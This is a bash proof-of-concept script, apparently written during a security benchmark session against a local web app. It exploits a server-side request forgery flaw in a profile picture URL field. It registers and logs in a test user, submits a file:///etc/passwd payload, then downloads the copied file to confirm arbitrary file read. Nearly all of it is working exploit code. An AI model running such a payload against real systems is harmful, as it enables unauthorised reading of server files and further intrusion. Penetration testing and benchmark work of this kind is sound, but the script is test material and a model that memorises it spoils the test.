#!/bin/bash
# POC: Simplified SSRF POC demonstrating file:// URL exploitation via profile_picture_url parameter
# Target: ./repo
# Created: 2025-11-04T17:26:34.064Z
# Session: benchmark-XBEN-024-24-mhktkgzl

# SSRF Vulnerability POC via profile_picture_url Parameter - Version 2
# Simplified version with robust error handling

TARGET_URL="${TARGET_URL:-http://localhost:5000}"
TEST_EMAIL="ssrf_test_$(date +%s)@example.com"
TEST_PASSWORD="test123pass!"

echo "[*] SSRF via profile_picture_url POC"
echo "[*] Target: $TARGET_URL"

# Create temp files
COOKIES="/tmp/ssrf_cookies_$$.txt"
RESPONSE="/tmp/ssrf_response_$$.txt"

cleanup() {
    rm -f "$COOKIES" "$RESPONSE"
}
trap cleanup EXIT

# Test 1: Try to register
echo "[*] Registering test user..."
curl -s -X POST "$TARGET_URL/register" \
  -d "email=$TEST_EMAIL&password=$TEST_PASSWORD&confirm_password=$TEST_PASSWORD" \
  > "$RESPONSE" 2>&1

if grep -q "success\|registered" "$RESPONSE"; then
    echo "[+] Registration successful"
elif grep -q "already exists" "$RESPONSE"; then
    echo "[*] User already exists"
else
    echo "[-] Register response: $(cat $RESPONSE | head -c 200)"
fi

# Test 2: Login
echo "[*] Logging in..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIES" -X POST "$TARGET_URL/login" \
  -d "email=$TEST_EMAIL&password=$TEST_PASSWORD" 2>&1)

if [ -s "$COOKIES" ]; then
    echo "[+] Login successful, cookies obtained"
else
    echo "[-] Login may have failed"
fi

# Test 3: Exploit SSRF
echo "[*] Sending SSRF payload (file:///etc/passwd)..."
curl -s -b "$COOKIES" -X POST "$TARGET_URL/profile" \
  -d "profile_picture_url=file:///etc/passwd" \
  > "$RESPONSE" 2>&1

echo "[+] Profile endpoint response received"

# Test 4: Check if file is accessible
echo "[*] Checking for uploaded file..."
HTTP_CODE=$(curl -s -o /tmp/passwd_check_$$.txt -w "%{http_code}" "$TARGET_URL/static/uploads/passwd" 2>&1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SSRF SUCCESS: File accessible via HTTP ($HTTP_CODE)"
    if grep -q "root:" /tmp/passwd_check_$$.txt; then
        echo "[+] CONFIRMED: /etc/passwd content found in response"
        echo "[+] Vulnerability: SSRF allows reading arbitrary files"
    fi
    rm -f /tmp/passwd_check_$$.txt
else
    echo "[-] File not accessible (HTTP $HTTP_CODE)"
fi

echo "[*] POC Complete"